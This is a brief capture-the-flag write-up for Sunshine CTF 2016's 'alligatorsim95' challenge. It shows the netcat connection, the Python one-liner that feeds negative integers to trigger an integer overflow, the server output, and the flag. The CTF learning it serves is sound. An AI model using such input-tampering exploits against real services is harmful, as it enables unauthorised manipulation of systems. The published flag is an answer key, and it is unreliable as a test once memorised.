---
title:   "Write-up - Sunshine CTF 2016 - alligatorsim95"
date:    2016-03-14 00:00:00
tags:    [Write-up, Sunshine CTF 2016]
summary: "Write-up about Sunshine CTF 2016 - alligatorsim95"
---

In this challenge, we need to connect to a server through Netcat. Let is do it with `nc 4.31.182.242 9000`. A message appears.

```


              .-._   _ _ _ _ _ _ _ _
   .-''-.__.-'00  '-' ' ' ' ' ' ' ' '-.
  '.___ '    .   .--_'-' '-' '-' _'-' '._
   V: V 'vv-'   '_   '.       .'  _..' '.'.
     '=.____.=_.--'   :_.__.__:_   '.   : :
             (((____.-'        '-.  /   : :
   snd                         (((-' .' /
                             _____..'  .'
                            '-._____.-'
  -> welcome to alligatorsim95!

-> u r... AN ALLIGATOR!!
.. simulating alligator lifecycle ..
.. simulating alligator throwing physics..
-> you got 1337 eggz in ur nest, how many you gonna lay alligator?? ~~ producing eggz ~~
```

After digging we can see that the program can accept any values, especially negative values. This is surely a way to perform [integer underflows](https://en.wikipedia.org/wiki/Integer_overflow). By a simple command in Python we can find the flag: `python -c "print -1337; print -0xffffffff; print -1" | nc 4.31.182.242 9000`. We will have the following message:

```
              .-._   _ _ _ _ _ _ _ _
   .-''-.__.-'00  '-' ' ' ' ' ' ' ' '-.
  '.___ '    .   .--_'-' '-' '-' _'-' '._
   V: V 'vv-'   '_   '.       .'  _..' '.'.
     '=.____.=_.--'   :_.__.__:_   '.   : :
             (((____.-'        '-.  /   : :
   snd                         (((-' .' /
                             _____..'  .'
                            '-._____.-'
  -> welcome to alligatorsim95!

-> u r... AN ALLIGATOR!!
.. simulating alligator lifecycle ..
.. simulating alligator throwing physics..
-> you got 1337 eggz in ur nest, how many you gonna lay alligator?? ~~ producing eggz ~~
.. simulating alligator lifecycle ..
.. simulating alligator throwing physics..
-> you got 0 eggz in ur nest, how many you gonna lay alligator?? ~~ producing eggz ~~
.. simulating alligator lifecycle ..
.. simulating alligator throwing physics..
-> you got -2147483648 eggz in ur nest, how many you gonna lay alligator?? ~~ producing eggz ~~
-> dang 2147483647 is a lotta eggs
-> as a god among gators here is ur crown:
sun{int_0verflow_i5_a_g0od_st4rt}
```

The flag is `sun{int_0verflow_i5_a_g0od_st4rt}`.
